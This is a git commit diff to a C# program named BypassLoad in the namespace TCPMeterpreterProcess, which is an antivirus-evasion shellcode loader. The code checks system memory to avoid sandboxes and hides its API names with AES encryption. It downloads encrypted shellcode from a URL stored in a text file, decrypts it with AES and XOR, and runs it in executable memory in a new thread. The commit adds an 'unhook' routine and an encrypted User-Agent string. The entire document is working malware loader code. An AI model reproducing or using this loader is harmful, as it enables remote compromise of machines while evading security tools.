d5bc3932316102f52aa7e3ecbdc1b28756979b5b
FoRever <38810849+Mangofang@users.noreply.github.com>
2024-01-29 00:58:59 +0800

    Update Program.cs

--- BypassLoad/Program.cs
+++ BypassLoad/Program.cs
@@ -1,7 +1,8 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Management;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
@@ -13,16 +14,22 @@ namespace TCPMeterpreterProcess
     {
         internal static class Unsafe
         {
+            
             [DllImport("Kernel32")]
             internal static extern IntPtr GetProcAddress(IntPtr hModule, string procname);
             [DllImport("Kernel32")]
             internal static extern IntPtr LoadLibrary(string moduleName);
-            internal delegate UInt32 Virtual_Alloc(
-            UInt32 lpStartAddr,
-            UInt32 size,
-            UInt32 flAllocationType,
-            UInt32 flProtect);
         }
+        internal delegate bool Write_Process_Memory(
+            IntPtr hProcess,
+            IntPtr lpBaseAddress,
+            byte[] lpBuffer,
+            uint nSize,
+            out UIntPtr lpNumberOfBytesWritten);
+        internal delegate bool Virtual_Free(
+            IntPtr lpAddress,
+            uint dwSize,
+            uint dwFreeType);
         internal delegate UInt32 Virtual_Alloc(
             UInt32 lpStartAddr,
             UInt32 size,
@@ -39,8 +46,19 @@ namespace TCPMeterpreterProcess
             IntPtr hHandle,
             UInt32 dwMilliseconds
         );
+        static string key = "BsijVUv2v+Ql/NM3pQv8uQ==";
+        static string k = "AyD9Y9zW9dtvfqJzJb33gA==";
+        static string v = "YlnmzpP5550nqLxW+3wdNQ==";
+        static string c = "AkJecKOgemBiLxROAtA9WA==";
+        static string w = "cH9ouyrpylq2wwZqDlf5Uod4zw5Vx+OrGTO0iMg4ah8=";
         static void Main(string[] args)
         {
+            run_1();
+            //run_2();
+        }
+        private static void run_1()
+        {
+            
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
             ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
             double totalMemoryMb = 0;
@@ -52,26 +70,45 @@ namespace TCPMeterpreterProcess
             if (totalMemoryMb >= 3999)
             {
                 byte[] shellcode = GetShellCode();
-                string key = "BsijVUv2v+Ql/NM3pQv8uQ==";
-                string k = "AyD9Y9zW9dtvfqJzJb33gA==";
-                string v = "YlnmzpP5550nqLxW+3wdNQ==";
-                string c = "AkJecKOgemBiLxROAtA9WA==";
-                string w = "cH9ouyrpylq2wwZqDlf5Uod4zw5Vx+OrGTO0iMg4ah8=";
-                
-                IntPtr trva = Unsafe.GetProcAddress(Unsafe.LoadLibrary(AesDecrypt(k, key)), AesDecrypt(v, key));
+                IntPtr K_handler = Unsafe.LoadLibrary(AesDecrypt(k, key));
+                IntPtr trva = Unsafe.GetProcAddress(K_handler, AesDecrypt(v, key));
+
+                unhook(K_handler, trva);
+
                 Virtual_Alloc va = (Virtual_Alloc)Marshal.GetDelegateForFunctionPointer(trva, typeof(Virtual_Alloc));
-                IntPtr trct = Unsafe.GetProcAddress(Unsafe.LoadLibrary(AesDecrypt(k, key)), AesDecrypt(c, key));
-                IntPtr trwf = Unsafe.GetProcAddress(Unsafe.LoadLibrary(AesDecrypt(k, key)), AesDecrypt(w, key));
+                IntPtr trct = Unsafe.GetProcAddress(K_handler, AesDecrypt(c, key));
+                IntPtr trwf = Unsafe.GetProcAddress(K_handler, AesDecrypt(w, key));
+
+                unhook(K_handler, trct);
+                unhook(K_handler, trwf);
+
                 Create_Thread ct = (Create_Thread)Marshal.GetDelegateForFunctionPointer(trct, typeof(Create_Thread));
                 Wait_ForSingle_Object wfoi = (Wait_ForSingle_Object)Marshal.GetDelegateForFunctionPointer(trwf, typeof(Wait_ForSingle_Object));
-
+                
                 UInt32 mem = va(0, (UInt32)shellcode.Length, 0x1000, 0x40);
                 Marshal.Copy(shellcode, 0, (IntPtr)(mem), shellcode.Length);
                 UInt32 threadId = 0;
                 IntPtr hThread = ct(0, 0, mem, IntPtr.Zero, 0, ref threadId);
                 wfoi(hThread, 0xFFFFFFFF);
             }
+        }
+        
+        private static void unhook(IntPtr K_handler,IntPtr inptrfa)
+        {
+            byte[] assemblyBytes = { };
+            int size = sizeof(int);
+            byte[] read = new byte[size];
+            Marshal.Copy(inptrfa, read, 0, size);
+            UIntPtr bytesWritten = UIntPtr.Zero;
 
+            string Aes_vf = "oWoor6Bfv1W3yL4QM0gHMw==";
+
+            IntPtr newMemory = Marshal.AllocHGlobal(read.Length);
+            Marshal.Copy(read, 0, newMemory, read.Length);
+            IntPtr vf_add = Unsafe.GetProcAddress(K_handler, AesDecrypt(Aes_vf, key));
+            Virtual_Free vf = (Virtual_Free)Marshal.GetDelegateForFunctionPointer(vf_add, typeof(Virtual_Free));
+
+            vf(inptrfa, 0, 0);
         }
         private static char[] Xor_Decrypt(char[] data)
         {
@@ -80,7 +117,6 @@ namespace TCPMeterpreterProcess
             {
                 data[i] ^= key[i % key.Length];
             }
-
             return data;
         }
 
@@ -88,44 +124,39 @@ namespace TCPMeterpreterProcess
         {
             if (string.IsNullOrEmpty(str)) return null;
             Byte[] toEncryptArray = Convert.FromBase64String(str);
-
             RijndaelManaged rm = new RijndaelManaged
             {
                 Key = Encoding.UTF8.GetBytes(key),
                 Mode = CipherMode.ECB,
                 Padding = PaddingMode.PKCS7
             };
-
             ICryptoTransform cTransform = rm.CreateDecryptor();
             Byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
-
             return Encoding.UTF8.GetString(resultArray);
         }
         private static byte[] GetShellCode()
         {
-            string path = System.AppDomain.CurrentDomain.SetupInformation.ApplicationBase;
-            string webpath = File.ReadAllText(path + "webpath.txt", Encoding.UTF8);
+            string UserAgent = "/UiTAqd4SYU/cWqwQjNlt/0Slgaba9XvrXGtF4BGV+oI4+geZLyDFVmIWr236HHhnYtLHafUsVMkQbLhcdNw1XPhonbGx5BsjD4fMbiFDLc=";
+            string path = System.AppDomain.CurrentDomain.SetupInformation.ApplicationBase + "webpath.txt";
+            string webpath = File.ReadAllText(path, Encoding.UTF8);
             HttpWebRequest req = (HttpWebRequest)WebRequest.Create(new Uri(webpath));
             req.Method = "GET";
-            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
+            req.UserAgent = AesDecrypt(UserAgent, "BsijVUv2v+Ql/NM3pQv8uQ==");
             HttpWebResponse res = (HttpWebResponse)req.GetResponse();
             Stream stms = res.GetResponseStream();
             StreamReader reader = new StreamReader(stms, Encoding.UTF8);
             string result = reader.ReadToEnd();
             reader.Close();
             req.Abort();
-
             result = AesDecrypt(result, "BsijVUv2v+Ql/NM3pQv8uQ==");
             char[] c_result = result.ToCharArray();
             result = new string(Xor_Decrypt(c_result));
-
             byte[] shellcode = HexStringToBytes(result);
-
             return shellcode;
         }
         public static byte[] HexStringToBytes(string hexString)
         {
-            hexString = hexString.Replace(" ", "").Replace("0x", "").Replace("0X", "").Replace("-", "").Replace(":", "").Replace(",","");
+            hexString = hexString.Replace(" ", "").Replace("0x", "").Replace("0X", "").Replace("-", "").Replace(":", "").Replace(",", "");
             if (hexString.Length % 2 != 0)
                 throw new ArgumentException();
             return Enumerable.Range(0, hexString.Length / 2)
